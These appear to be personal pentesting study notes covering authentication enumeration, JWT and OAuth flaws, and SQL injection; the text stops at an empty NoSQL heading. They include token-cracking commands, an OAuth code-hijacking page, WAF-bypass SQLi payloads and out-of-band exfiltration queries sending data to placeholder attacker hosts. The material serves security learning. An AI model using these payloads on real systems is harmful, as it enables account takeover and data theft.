# Table of Contents

- [Enumeration and Bruteforce](#enumeration-and-bruteforce)
- [Session Management](#session-management)
- [JWT Security](#jwt-security)
- [OAuth Vulnerabilities](#oauth-vulnerabilities)
- [SQL Injection](#sql-injection)
- [Advanced SQL Injection](#advanced-sql-injection)
- [NoSQL Injection](#nosql)
- [XXE Injection](#xxe-injection)
- [LDAP Injection](#ldap-injection)
- [ORM Injection](#orm-injection)
- [Insecure Deserialisation](#insecure-deserialisation)
- [SSRF](#ssrf)
- [File Inclusion and Path Traversal](#file-inclusion-and-path-traversal)

*** ***

# Enumeration and Bruteforce

- It is one of the fundamental aspect of security testing which involves inspecting authentication components from username to password and session management. 

## Authentication Enumeration:

- Enumerating authentication is like checking if the key you found on the road might open up the gate of a mansion, but not the main door to the house. But, gives us a foothold inside the territory. 

- Identifying Valid Usernames:
    
    - By observing how the application responds to the throwed username attempts, we can identify if the username already exists or not. Common errors the log in throws are "this account does not exist" or "incorrect pasword". One tells us that the username exists but the password is incorrect. 
    
- Password Policies:

    - Enumerating password is also similar however, the guidelines used for the complexity of paswords in the application can give us insights. If the password we enter does not satisfy the policy defined in the pattern, then it will throw an error message revealing the regex code requirement. 
    
- Common places to enumerate:

    - Registration Pages
    
    - Password Reset Features
    
    - Verbose Errors
    
    - Data breach information
    
## Enumerating Users via Verbose Errors:

- Verbose errors are like unintentional whispers of a system whichh can expose sensitive data to those who know how to listen. They may provide insights such as internal paths, database details, user information.

- Triggering Verbose Errors:

    - Invalid Login Attempts
    
    - SQL injection
    
    - File Inclusion/Path Traversal
    
    - Form Manipulation
    
    - Application Fuzzing
    
- Role of Enumeration and Brute Forcing:

    - User Enumeration: sets the stage for subsequent brute-force attacks.
    
    - Exploitation of Verbose errors: information gained from these errors can help to discard aspects like password policies and account lockout mechanisms.
    
## Vulnerable Password Reset Logic:

- Email-Base Reset: 

    - heavily relies on the security of the user's email account and the secrecy of the link or token sent.
    
- Security Question-Based Reset:

    - can be compromised if an attacker gains access to personally identifiable information or just take a guess.
    
- SMS-Based Reset:

    - Similar to email-based reset but can be vulnerable to SIM swapping attacks or intercepts.
    
- Each of these methods has its vulnerabilities:

    - Predictable Tokens
    
    - Token Expiration Issues
    
    - Insufficient Validation
    
    - Information Disclosure
    
    - Insecure Transport
    
## Exploiting Predictable Tokens:

- Simple, predictable or having long expiration times can be vulnerable to interception and brute force. If we have enumerated an email and has vulnerable token methodology, then we can simply capture the request of the reset password page and try to brute force the token that was sent to the email of the user. Crunch can be helpful in such scenarios. Suppose if the application sets a random three-digit PIN as the reset token without mixed characters then, it can be easily exploited.

    $ crunch 3 3 -o otp.txt -t %%% -s 100 -e 999
    
- With the 3 digits generated codes from 100 to 999, we can use Burps intruder to bruteforce and identify the valid reset token. 

## Exploiting HTTP Basic Authentication:

- Basic authentication offers a simple method when securing access to devices as it only requires a username and password. It is basically used on devices with limited processing capabilities. Routers usually utilise basic authentication to control access to their admin interfaces. Unlike OAuth or token-based authentication, it is suitable for environments where session management and user tracking is not necessary. 

- The username and password is transported as a base64-encoded string within the HTTP Authorization header.

    Authorization: Basic <credentials>
    
- It can be easily be brute forced, if the credential are weak. Burp intruder does a good job on exploiting such weak credentials. 

## OSINT:

- Wayback URLs

- Google Dork etc.

# Session Management

- Session is provided after an authentication or in some application the initial session is already created when you visit the application. Keeps state, track actions and decide authorization on the application. Session management is the process of managing theses sessions and ensuring they remain secure.

- Session creation -> Session Tracking -> Session Timeout -> Session Termination.

## Cookies vs Tokens:

- Cookie-Based Session Management:

    - Old-school way of managing sessions. "Set-Cookie: " header value will be sent by the browser where the cookie will be stored. This will be valid for the domain where the cookie was received from. Syntax for this session management are:
    
    Set-Cookie: <cookie-name>=<cookie-value>
    Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value> (defines the host to which domain will be sent)
    Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date> (maximum lifeline of the cookie)
    Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly (forbids JavaScript from accessing the cookie)
    Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<number> (number of seconds until cookie expires)
    Set-Cookie: <cookie-name>=<cookie-value>; Partitioned ( indicator for the storage of cookie using partioned storage)
    Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value> (indicated the path that must exisy in the requested URL)
    Set-Cookie: <cookie-name>=<cookie-value>; Secure  (sent to the server only when requested with https)
    Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Strict 
    Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Lax
    Set-Cookie: <cookie-name>=<cookie-value>; SameSite=None; Secure
    
    - The browser itself will decide when a certain cookie value will be sent with a request in cookie-based authentication. After the browser reviews the domain and the attributes of the cookie, it is attached automatically without any additional client-side JavaScript code.
    
- Token-Based Session Management:

    - It is relatively new concept where instead of using the browser's automatic cookie management features, it relies on client-side code for the process. After authentication, the web application provides a token in the request body which is then attached in the browser's local storage using client-side JavaScript code.
    
    - Everytime a request is made, Javascript code must load the token from storgae and attach it as a header. Most common types of token is JWT (Jason Web Tokens), that are passed through "Authorization: Bearer" header.
    
## Vulnerability in Session Lifecycle:

- Session Creation:

    - Weak Session Values: If a custom session creation mechanism has been implemented, then the session values can be guessable. If an attacker can reverse engineer the session creation process, they can generate or guess session values to hijack the accounts of users.
    
    - Controllable Session Values: In tokens like JWTs, all the information to create and verify the JWT's validity is provided. If security measures are not implemented then an attacker could craft their own token to get access to a vertical session.
    
    - Session Fixation: If a web application gives a session before even authenticated and the value does not rotate after authenicating, then a potenital threat actor could record it while victim is still unauthenticated and could gain access to the session even after the authentication.
    
- Session Tracking:

    - Authorization Bypass: If there aren't sufficient checks being performed on the activity of the user, then an attacker can be tampering with other user's dataset.
    
    - Insufficient Logging
    
- Session Expiry:

    - If the expiry time for a session is too long, then it is vulnerable to session hijacking.
    
- Session Termination:

    - The key issue here is when sessions are not properly terminated server-side even when logout action is performed. If an attacker has hijacked an user's session then terminating server-side only will not flush out the invader, even more issue is arised when the lifetime of the token is embedded in the token itself. 
    
## Exploiting Insecure Session Management:

- Enumerate the lifecycle of the session lifecycle. Understand the response headers after logging in. Based on the behaviours of session management, analyze if the cookie or token has any vulnerable features.

# JWT Security

## Token-Based Authentication:

- With the rise of API, and its distinctive functionality to server different interfaces such as web application and mobile application at the same time with the same server-side logic, cookies were a dead end, as it is only produced by the browser. Hence, token-based session management comes to play a part to utilise the distinctive feature of API. 

- Token-based session management is relatively a modern concept, or a successor to cookie-based session management. After authentication, the web application provides a token within the request body which is then used by client-side Javascript code to store it in browser's LocalStorage. With each new request made in the browser, Javascript must load the token from the storage and attach it as a header. JSON Web Tokens are one of the most common token used whcih is a way to standardise token-based session management.

- Interfacing API with cURL:

    ** Authenticating **

    $ curl -H 'Content-Type: application/json' -X POST -d '{"username":"user","password":"pasword"}' http://MACHINE_IP/api/v1.0/example
    
    ** Verifying **
    
    $ curl -H 'Authorization: Bearer [JWT Token]' http://MACHINE_IP/api/v1.0/example?username=user
    
## JSON Web Tokens:

- JWTs are self contained tokens used to securely transmit session information. A JWT has three components, each Base64Url encoded and seperated by dots:

    - Header: indicates the type of token, as well as the signing algorithm used.
    
    - Payload: body of the token that contains the claim. 
    
    - Signature: part of the token which provides a method for verifying the tokens authenticity. 
    
- Signing Algorithms:

    - None: no algorith used.
    
    - Symmetric Signing: creates the signature by appending a secret value to the header and body of the JWT before generating a hash value. Any system having the knowledge of the secret key can verify the signature. Example: HS256.
    
    - Asymmetric Signing: this algotrithm creates the signature using a private key to sign the header and body of JWT. First, the hash value is generated, then the private key is used to encrypt the hash value. Example: RS256.
    
- JWTs can be encrypted (called JWEs), but its main power comes from the signature. 

## Sensitive Information Disclosure:

- Cookie-based session management uses the server-side session to store parameters, for example $SESSION['var']=data in PHP. These are not exposed client-side so it is safe that it cannot be exposed. But, with tokens, the claims are exposed as the entire JWT is sent client-side. If same coding practices are followed like cookies, then sensitive information can be disclosed.

## Signature Validation Mistakes:

- Not Verifying the Signarure:

    - If the server does not verify the signature of JWT, then we can modify the claims in the JWT to whatever we want such as escalating our claim to admin from user.
    
- Downgrading to None:

    - As JWTs support the None signing algorithm, which means no signarure is used with the JWT. This standard was created for server-to-server communication, where the signarure of the JWT was verified in the upstream process. Hence, the second server would not be required to verify the signature. However, if the developers did not lock in the signature alogrithm during production, or deny the None algorithm, then it can be simply changed to None which would cause the library used for signature verification to always return true. This mistake could also lead us to forge any claims within our token.
    
- Weak Symmetric Secrets:

    - If a token is created using symmetric signing, then the security of the JWT relies on the strength of the secret used. If a weak secret is used, then it can be possible to perform cracking to recover the secret. Once the secret value is known, we can once again alter the claims in the JWT and create a valid signature using the secret.
    
    - A practical way for this type of weak secret key can be first copy your token where you are user then save it in a text file in the computer. Then, we can use "jwt.secrets.list" from the github repo that contains weak secret keys used in JWT. Finally hashcat can be used to crack the secret in the JWT token.
    
        $ hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
        
    - Once the secret is known, we can craft a valid token with manipulated claims.
    
- Signature Algorithm Confusion:

    - Another issue with signature validation is when an algorithm confusion can be performed. This is similar to None downgrade attack, but it specifically happens with confusion between symmetric and asymmetric signing algorithms. If an asymmetric signing is used, for example RS256, then it may be possible to downgrade the alogrithm to HS256. In such cases, some libraries would default back to use the public key as the secret key for the symmetric signing algorithm. Since, the public key can be known, we can craft a valid signature by using the HS256 alogirth with the public key.
    
## JWT Lifetimes:

- If the "exp" value of a token is set too large or not set at all, the token would be valid for too long or it would be persistent. So,before veryfing the signature, the lifetime of a token should be calculated to ensure the token is still valid. 

## Cross-Service Relay Attacks:

- As, JWTs are often used in systems with a centralised authentication system which serves multiple applications. If the audience claim is not correctly set up, then a cross-service relay attack can be executed to perfrom a privilege escaltion.

- The Audience Claim:

    - JWTs can have audience claim in cases where a single authentication system serves multiple applications. This helps to indicate which application the JWT is intended for. But, the enforcement has to be done on the application, not the authentication server. If the claim is not verified, the JWT itself is regarded as valid through signature verification, which could cause consequences.
    
    - For example, an user has admin privileges or a higher role on a Application-A, but has user role on Application-B served by the same authhentication system. So, in the apllication-A, JWT allocated to the user has a claim that has a claim of "admin": true. So, if the audience claim is not verified on application-B, then the same user can trick the application in giving the admin acces to them. This is called Cross-Service Relay attack.

# OAuth Vulnerabilities

- OAuth 2.0 is a commonly used authorisation framework. Vulnerabilities in this framework allows for CSRF, XSS, data leakage and exploitation of other ones. 

## Key Concepts:

- Resource Owner:

    - The resouce owner is the person or system that controls certain data and can authorize an application to access that data on thier behalf. This is a regular user (us) that grant permissions to the application we are using to acces our data.
    
- Client:

    - The client is a mobile app or a server-side web application that acts as an interface for requesting access to resources and performing actions permitted by the resource owner. 
    
- Authorization Server:

    - The authorization server is responsible to issue access tokens to the client after a successful authentication and obtaining their authorization. It is a key player in the OAuth flow, as it endures the client is only granted permission after a legitimate user authentication and consent. 
    
- Resource Server:

    - This server holds the protected resources of the resource owner that can only be displayed to the requester after using access tokens given by authorization seerver. It basically responds to the request made by the client, allowing it to retrieve and modify data. 
    
- Authorization Grant:

    - This is type of permission given to the web app (client) to gain an access token from the authorization server. The primary grant types are "Authorization Code", "Implicit", "Resource Owner Password Credentials", and "Client Credentials". 
    
- Access Token:

    - It is a credential that the client can use to acesss the protected resources on the behalf of the resource owner. It has a limited lifespan and scope. This acts as a magic key that lets the app to access your acount and place orders and make payments wihtout asking you to log in again for a specific period of time. 
    
- Refresh Token:

    - It is a credential that the client can use to obtain a new access token without requiring the resource owner to re-authenticate. They are usually long-lived and helps in maintaining the user session wihtout frequent log in interruptions. 
    
- Redirect URI:

    - This is the URI to which the authorization server redirects the resource owner's user-agent after the grant or denial of the authorization. This is the case of a successfull login.
    
- Scope:

    - It is a mechanism for limiting an application's access to user's account. Client decides the level of access the user needs and the authorization server informs the user what access levels the application is requesting. 
    
- State Parameter:

    - This is the paramter that maintains the state between the client and the authorization server. This helps to prevent CSRF attacks by ensuring the response matches the client's request. 
    
- Token and Authorization Endpoint:

    - The auhtorization server's endpoint is where the client exchanges the authorization grant for an access token. So, this endpoint is where the resource owner (user) is actually authenticated to where the client is given authorization to access protected reosurces.
    
## OAuth Grant Types:

- These grant types define how an application can obtain an access token to access protected resources on behalf of the resource owner. Four primary grant types are:

    - Authorization Code Grant: This grant is the most commonly used OAuth 2.0 flow suited for server-side applications (PHP, JAVA, .NET etc). In this flow, the client redirects the user to the authorization server, where the user authenticates and grants authorization. Then, the authorization server redirects user to the client with a authorization code. Client uses this authorization code to get access token from authorization server's token endpoint. Here the authorization code exchanged for the access token is server-server, which means the access token is not exposed to the user agent. This is the most secure grant that reduces the risk of token leakage.
    
    - Implicit Grant: This grant is designed for mobile and web applications where client cannot securely store secrets. Here, authorization code is not required to get access token. In this flow, the client redirects the user to the authorization server for authentication, then after granting the access, the authorization server returns the access token in URL fragment allowing the client to access protected resources. It is less secure as the access token is exposed to the user agent. Also, it does not support refresh tokens.
    
    - Resource Owner Password Credentials Grant: This grant is used when the client is highly trusted by the resource owner, such as first party applications. The client collects the users credentials directly then exchanges them for access token. However, it is less secure comparably.
    
    - Client Credentials Grant: This grant is used for server-server interactions without user interaction. The client uses the stored credentials to authenticate to the authorization server and get a access token. This is like a facebook app or instagram app where we dont need to log in everytimme, the client does its job automatically without user interaction. This reduces security risks related to user data exposure. 
    
## How OAuth Flow Works?

- The OAuth 2.0 flow begins when a user (Resource Owner) interacts with the client application (browser) and requests access to a specific resource. The client redirects the user to an authorization server, where user needs to authenticate and grant access. Then, the authorization server provides an authorization code which is used by the client to exchange for an access token. The received access token then allows client to access the resource server and retrieve the requested resource on behalf of the user. 

- OAuth provider is a third party Aauthorization server which we can identify nowadays as "Google". We can see nowadays that in every web application, there is a button "Sign up with Google". So, google basically acts as the meshiah of the authorization server nowadays.

- Authorization Request:

    - This is the first request needed to be completed if we want to integrate/authenticate the application with the OAuth provider. So, when we first click "Sign up with google", google must obtain the permission of the user, so the application redirects client to the authorization server with an authorization request. The OAuth toolkit is the server side language used by the application built to deal with the authorization server. So, if the OAuth toolkit for the OAuth provider is built on Django OAuth, then the client redirected to the authorization server will look like this "https://accounts.google.com/o/oauth2/v2/auth?
 scope=https%3A//www.googleapis.com/auth/drive.metadata.readonly%20https%3A//www.googleapis.com/auth/calendar.readonly&
 access_type=offline&
 include_granted_scopes=true&
 response_type=code&
 state=state_parameter_passthrough_value&
 redirect_uri=https%3A//developers.google.com/oauthplayground&
 client_id=client_id"
    
    - response_type=code: This indicates that google is expecting an authorization code in return.
    
    - state : A CSRF token to ensure that the request and response are part of the same transaction.
    
    - redirect_uri: The URL where the google will send the user after he grants permission (which is basically the pre-registered redirect URIs for the client application).
    
    - scope: Specifies the level of access requested.
    
    - client-id: The client id for the web application
    
    - By looking at these parameters, google understand what is requested and where to send the user afterwards.
    
- Authentication and Authorization:

    - When the user reaches the authorization servers with all these paramters set partially, he needs to log in using his credentials. After logging in successfully, the authorization server ask to grant the permission for the web application he is signing for to access his details.
    
- Authorization Response:

    - If the user agrees to grant access, then the authorization server generates an authorization code and redirects the user to the client application using the specified "redirect_uri". The redirect ensures the authorization code and the original state parameter to ensure the integrity of the flow. This ensures the authorization process is secure and the response matches the original request state parameter. 
    
- Token Request:

    - Now, the client app exchanges the authorization code for an access token by requesting the authorization server's token endpoint with a POST request with these parameters:
    
        - grant_type: type of grant used
        
        - code: authorization code received previously
        
        - redirect_uri: must match the original redirect_uri while making authorization request
        
        - client_id and client_secret: credentials for authenticating the client application.
        
- Token Response:

    - The authorization server then authenticates the client application and validates the authorization code. The server becomes happy and responds with an Access Token and optionally a Refresh Token.
    
    - The response normally includes:
    
        - access_token: token of gratitide
        
        - token_type: Typically "Bearer"
        
        - expires_in: duration in seconds the access token is valid for
        
        - refersh_token(optional): token used to obtain new access token automatically
        
- With this deep and meaningful bonding between the client application, user, and the authorization server, access tokens can now be used to authenticate requests to the resource server to access the user's profile details. In this way a client application completes its OAuth 2.0 authorization workflow with the access token in hand. So now, with each request to the resource server, access token is included and treated as a family although it came from outside. It goes in the auhtorization header which ensures that the server recognizes and permits the access.

## Identifying OAuth Usage in an Application:

- Login Process.

- Analyze network traffic during log in process. HTTP redirects. 

- Look for URL query parameters like response_type, client_id, redirect_uri, scope and state.

- Identifying the OAuth Framework:

    - After the confirmation of OAuth being used, now its time to identify specific framework or library the application uses. Some of the strategies are:
    
        - HTTP Headers and Responses
        
        - Source Code Analysis
        
        - Authorization and Token endpoints
        
        - Error messages
        
## Exploiting OAuth - Stealing OAuth Token:

- We know that the acess tokens are issued by the authorization server and redirected to the client application based on the redirect_uri parameter. SO, if the redirect_uri is not well protected, attackers can exploit it to hijack tokens.

- Role of Redirect_URI:

    - Redirect_URI is specified during the OAuth flow to direct where the authorization server should send the token after authorization. This URI must be pre-registered in the application settings to prevent open redirect vulnerabilities.
    
- Vulnerability:

    - An insecure redirect_uri can lead to good security issues for attacker to exploit. It is like finding a goldmine in the middle of an ocean. They can manipulate the flow to intercept tokens.
    
    - If we have control over a domain "dev.nischal.com", which is in the applications redirect_uri settings, then we can set the redirect_uri to this specific domain "/callback" to receive the token of an legit user session. The attacker initiates an OAuth flow and ensure the redirect_uri points to their controlled domain. After the user authoirzes the application, the token is then received on the attackers end and could be used to access protected resources. 
    
- Preparing the Payload:

    - Suppose we have a compromised domain of a client application. We can host any HTML page on the server. Through some social engineering or phising, we could craft a simple HTML page (redirect_uri.html) with a simple code:
    
        <form action="http://google.com:8000/oauthdemo/oauth_login/" method="get">
            <input type="hidden" name="redirect_uri" value="http://compromised.domain.com:8002/malicious_redirect.html">
            <input type="submit" value="Hijack OAuth">
        </form>
        
    - The form send a hidden redirect_uri parameter with the value of the compromised domain and submits the request to the authorization server. The malicious_redirect.html will then intercept the auhtorization code from the URL using:
    
        <script>
            // Extract the authorization code from the URL
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            document.getElementById('auth_code').innerText = code;
            console.log("Intercepted Authorization Code:", code);
            // code to save the acquired code in database/file etc
        </script>
        
    - Since the attacker has complete control over the subdomian, once the victim is redirected to the attacker-controlled domain, he will save the credentials in a database/file for later use. Also, the redirection from redirect_uri to the original URL would be so fast that the victim will not realize that his authorization code has been hijacked. 
    
    - The attacker can send the victim the link (http://compromised.domain.com:8002/redirect_uri.html) through socal engineering or CSRF attack. Once clicked, he will be on a normal authorization server that will ask to authenticate. So, when he does that, the authorization code will be sent to (http://compromised.domain.com:8002/malicious_redirect.html), that allows the attacker to intercept the code and misue it. 
    
    - Attacker Perspective:
    
        - From the attackers machine, they can utilize this intercepted authorization code to call the /callback endpoint and exchange it for a valid access token. In an OAuth flow, the callback endpoint is always available, accepting code parameter and returing an access token. With this, Shyam's account has now two owners. 
        
## Exploiting OAuth - CSRF in OAuth:

- The state parameter in the framework protects the client from CSRF attacks, but if this is not present or predictable (static value like "state" or a simple sequential number), then we can initiate an OAuth flow and provide malicious redirect URI. This is all possible because of the weak or absent state parameter.

- Attacker Perspective:

    - Suppose, we visit a web application that uses authorization server for syncing contacts. Once we click on Sync contacts we see on the URL parameter that the state parameter is missing. OH NO. Now, this can cause CSRF attack to be possible. 
    
    - First, the evil attacker gets his authorization code by syncing his contacts. It can be achived by using Burp Suite to intercept the authorization process. So, the authorization code the attacker gets can let any user get an access token against it. So, the attacker plans to send the paylaod link captured before completing the OAuth flow. So, if anyone opens the link that the attacker recieved when intercpting the authorization flow in between when recieving the authorization code, then the attacker's authorization server will be linked to the victim's.
    
## Exploiting OAuth - Implicit Grant Flow:

- In the implicit grant flow, tokens are directly returned to the client through the browser wihtout needing an authorization code. This flow is primarily used by a single-page applications and is designed for public clients who cannot securely store client secrets. However, this flow has some vulnerabilties:

    - Exposing Access Token in URL (access token visible in URL)
    
    - Inadequate Validation of Redirect URIs (manipulation of redirect URI)
    
    - No HTTPS implementation (Man-in-the-middle)
    
    - Improper Handling of Access tokens (vulnerable to XSS)
    
- Depreciation of Implicit Grant Flow:

    - Due to such nonsense behaviours done by this flow, the OAuth 2.0 Security Best Current Practice recommends depreciating the implicit grant flow in favour of the authorization code flow with "Proof Key for Code Exchange(PKCE)". This is the better version that outperforms the vulnerable one.
    
# SQL Injection

- SQL (Structured Query Language) Injection, is a type of attack on web application database server that causes malicious queries to be executed.

- A Database is controlled by DBMS (Database Management System) and is defined into two types: Realtional and Non-Relational. Common Realtional databses are MySQL, Microsoft SQL Server, PostgreSQL etc, and databases such as MongoDB with other falls under non-relational databases.

- Multiple databases are stored within a DBMS, each having its own set of related data. This database data is stored in a table that are identified with a unique name for each one.

- A table is made up of columns and rows. Each column has a unique name per table. Rows are basically the record inside the column.

## Relational Vs Non-Relational Databases:

- A Relational database stores information in tables. To share information between different tables, column is used to specify and define the data being stored where rows are the stored data. Tables contain a column that has a unique ID (primary key), which is used in other tables as well to reference it and trigger a relationship between the tables.

- On the other hand, a Non-Relational database also known as NoSQL, are a type of database that do not use tables, columns and rows to store data. Like, relational database, they are not bound to relate to anything, that means each row of data can contain different information.

## SQL:

- A feature rich language for quering databases. 

- SELECT (used to retrieve data from the database)

- UNION (combines the results of two or more SELECT statements to retrieve from single or multiple tables)

- INSERT (tells the database to insert a new row of data into the table)

- UPDATE (update the records in the table)

- DELETE (obviously deletes)

## SQL Injection:

- It occurs wehen the user input is not sanitised and the input provided by the user gets included in the SQL query.

- For Example:
    
    - "https://webstime.com/blog?id=1" uses "SELECT * from blog where id=1 and private=0 LIMIT 1;" in a SQL statement to retrieve the data. So, if we can do "https://website.com/blog?id=2;--", it would also reveal the information of other article if it is vulnerable to injection and is set to private. So, this call to the URL will produce "SELECT * from blog where id=2;-- and private=0 LIMIT 1;" in the SQL statement. 
    
    - ";" orders the end of the SQL statement, and "--" causes everything after to be treated as a comment resulting in the data disclosure of that id.
    
## In-Band SQL Injection:

- It refers to the same method of communication for the exploitation and extraction of data, such as discovering vulnerability on a website page and also extracting data from the database in the same page. 

- Error-Based SQL Injection:

    - used to obtain information about the database structure or enumerate a whole database based on error messages. Eg: "SELECT * FROM users WHERE id=1 AND 1=CONVERT(int, (SELECT @@version))". If the database version is returned in the error message, it reveals the information about the database
    
- Union-Based SQL Injection:

    - used alongside SELECT statement to return additional results to the page. Eg: "SELECT name, email FROM users WHERE id=1 UNION ALL SELECT username, password FROM admin".
    
## Inferential (Blind) SQLi:

- Unlike In-band, we have little to no feedback whether our injected queries were successfull or not. Normally, the attacker needs to send payloads and observe the application's behaviour and response times to gain information about the database. 

- Authentication Bypass:

    - This is a straightforward technique of asking the database server, "do you have this or not"?
    
    - "' OR 1=1;--" creates a SQL query "select * from users where username='' and password='' OR 1=1;".  This always cause the query to return as true that satisfies the web application logic.
    
- Boolean-Based Blind SQLi:

    - It refers to the response after injecting our payload, that could be true/false, yes/no, on/off or any response thtat have only two outcomes. Eg: "SELECT * FROM users WHERE id = 1 AND 1=1" (true condition), "SELECT * FROM users WHERE id = 1 AND 1=2" (false condition). 

- Time-Based Blind SQLi:

    - This refers to the time taken for the query to be completed. SLEEP() method is used in this injection to check for behaviour of the provided query. Eg: "SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05' --".

## Out-of-Band SQLi:

- This type of injection can be triggered depending on the specific features being enabled on the database server or the web application's business logic that makes a call to the external network based on the results from an SQL query (e.g., HTTP or DNS). It basically gives away the databases information externally to the attacker's hosted server. 

## Remediation:

- Prepared statements with parameterized queries. 

- Input validation such as allowing and restricting input to only certain strings.

- Escaping User Input such as '"$\ to be parsed as a regular string rather than special character.

# Advanced SQL Injection

## Second-Order SQL Injection:

- This injection occurs when a user supplied input is saved and used in a different part of the application, giving it the name second-order SQL injection. The first malicious SQL injection attempt does not throw off errors which makes it harder to detect even with standard input validation techniques. And, on the second use of the injection then results in the attack.

## Filter Evasion Techniques:

- Character Encoding:

    - URL Encoding: a common method where characters are represented using a percent(%) sign followed by their ASCII value in hexadecimal. This encoding might help input to break through web application filters and be decoded by the database.
    
    - Hexadecimal Encoding: an effective technique for constructing SQL queries using hexadecimal values. It has the ability to bypass any filters that do not decode these values before processing the input.
    
    - Unicode Encoding: represents characters using Unicode escape sequences. This method bypasses filters that only check for specific ASCII characters, while the database will think of it as a family call and correctly process the encoded input.
    
- No-Quote SQL Injection:

    - can be used when the application filters single or double quotes or escapes.
    
    - Using Numerical Values: a technique which can be used to bypass filters that specifically look for an escape or strip out quotes. For example: "OR 1=1" without any quotes. The idea is to escape the strip out function "'" which may have been blocked.
    
    - Using SQL Comments: "--" can be used to terminate the rest of the query which can also be helpful to bypass filters and prevent syntax errors.
    
    - Using CONCAT() Function: This function can be used to construct strings without quotes. The idea of this is to create a string without directly applying quotes which makes harder for filters to detect and block the payload. 
    
- No Spaces Allowed:

    - There are times when developers will filter out spaces to prevent from SQLi.
    
    - Comments to Replace Spaces: /**/.
    
    - Tab or Newline Characters: tab(\t) or newline(\n).
    
    - Alternate Characters: an effective method is using alternative URL-encoded characters representing different types of whitespace, like'%09'(horizontal tab), '%0A'(line feed), '%0C'(form feed) etc.

- Techniques to try and bypass filters and WAFs:

    - SELECT banned: SElEcT*FrOm users or SE/**/LECT*FROM/**/users
    
    - Spaces banned: SELECT%0A*%0AFROM%0Ausers or SELECT/**/*/**/FROM/**/users
    
    - UNION, SELECT banned: SElEcT*FROM users WHERE username=CHAR(0x61,0x64,0x6D,0x69,0x6E)
    
    - OR, AND, SELECT, UNION banned: SElECT * FROM users WHERE username=CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users
    
## Out-of-band SQL Injection:

- a technique used to exfiltrate data or execute malicious actions when direct methods are ineffective.

- uses seperate channels for sending the payload and receiving the response. Common protocols that can be leveraged are HTTP requests, DNS queries, SMB protocol or other network protocols that the database server might have access to. This enables attackers to bypass firewalls, intrusion detection systems and other security measures. 

- Techniques in Different Databases:
    
    - MySQL and MariaDB: 
        
        'SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';'
        
        - To access this file, we could receive this with an SMB share or HTTP server running on the database server.
        
    - Microsoft SQL Server(MSSQL):
    
        'EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\ATTACKER_IP\logs\out.txt" -c -T';'
        
        - 'OPENROWSET' or 'BULK INSERT' can also be used to interact with external data sources.
        
- Examples of Out-of-Band Techniques:

    - HTTP Requests:
    
        - If a database function allow HTTP requests, attackers can send sensitive data directly to a web server they control. This will exploit the functionalities that make outbound HTTP connections. MySQL and MariaDB do not natively support HTTP requests, but it can be done through external scripts of User Defined Functions (UDP). An example query will look like 'SELECT http_post('http://attacker.com/exfiltrate',sensitive_data) FROM users;'. HTTP request exfiltration can be achieved on Windows and Linux(Ubuntu) systems, depending on the database functions for external scripts or UDFs that enable HTTP requests.
        
    - DNS Exfiltration:
    
        - AN attacker controlled malicious DNS server could be used to receive SQL queries generated with DNS requests with encoded data. Just like HTTP requests, an attacker have to perform system-level scripts or UDFs to generate DNS requests. 
        
    - SMB Exfiltration:
    
        - It involves writing query results to an SMB share on a external server. While this is particularly effective in Windows environments, it can also be configured in Linux systems. For example: 'SELECT sensitive_data INTO OUTFILE '\\\\ATTACKER_IP\logs\out.txt';'. SMB shares could be mounted and accessed in Linux using 'smbclient'.
        
## Other Techniques:

- HTTP Header Injection:

    - HTTP headers might carry user input that is used in SQL queries on the server side. In case of unsanitised input, it can lead to SQL injection. It involves modifying HTTP headers like 'User-Agent', or 'X-Forwarded-For' to inject SQL commands. 
    
- Exploiting Stored Procedures:

    - If the stored procedures are not properly handled, it can be vulnerable to SQL injection. They are like a routines stored in the database which can perform operations like inserting, updating, or quering data. Basically, stored procedures are pre-compiled SQL statements which is executed as a single unit. 
    
- XML and JSON Injection:

    - Applications that parse XML or JSON data and use that parsed data in SQL queries can be vulnerable to injection if inputs are not properly sanitised. If the structure of XML or JSON could be injected with malicious data, then the SQL queries will use them and help in successful injection. This can occur if an application directly parses values in SQL statements. 
    
## Automation:

- SQLMap: detects and exploits SQL vulns in web applications.

- SQLNinja: specifically designed to exploit vulnerabilites in Microsoft SQL Server.

- JSQL Injection: focused for detecting SQL injection in JAVA applications.

- BBQSQL: Blind SQL Injection exploitation framework.

- Relying on these tools alone will not help identify a injection vulnerabilites, so we must do manual analysis and validation to ensure security coverage. 

## Best Practices:

- A deep understanding of various techniques for the identification, and exploitation of SQL injection points must be gained by us pentesters:

    - Exploiting Database-Specific Features: Understanding different DBMS such as MySQL, PostgreSQL, Oracle, MSSQL to exploit these features effectively as they have unique features and syntax. 
    
    - Leveraging Error Messages: Carefully analyse error messages to gain insights into the database schema and structure. 
    
    - Bypassing WAF and Filter: Testing different techniques to bypass WAF and input filters such as using mixed case, concatenation, encoding, inline comments and different character encodings.
    
    - Database Fingerprinting: Determining the type and version of the database used.
    
    - Pivoting with SQL Injection: Once a database server is compromised, it can be used to gain access to other internal systems within the application.

- For the developers, some secure coding practices could help:

    - Parameterised Queries and Prepared Statements: Ensuring all user inputs are treated as data rather than executable code.
    
    - Input Validation and Sanitisation: Ensuring the input follows a certain format such as data type, length, ranges.
    
    - Least Privilege Principle: Giving the application accounts minimum necessary database permissions.
    
    - Stored Procedures: Encapsulating and validating SQL logic using stored procedure. 
    
# NoSQL

- This is a type of database where we can store data in an ordered way. There are many NoSQL solutions, but the principles about injection attacks in MongoDB can be applied to any NoSQL injection.

- The main difference between SQL and NoSQL databases is that the information is not stored in tables but rather in documents.  Just like a simple dictionary structure where key-value pairs are stored. These documents are stored in an associative array with an arbitrary number of fields. MongoDB basically allows to group multiple documents with a similar function together in higher hierarchy structures called collections for organizational purposes. Collections are like the tables in realational database. Then, these collections are grouped in the database that is the highest heirarchy element in MongoDB. 

## NoSQL Injection:

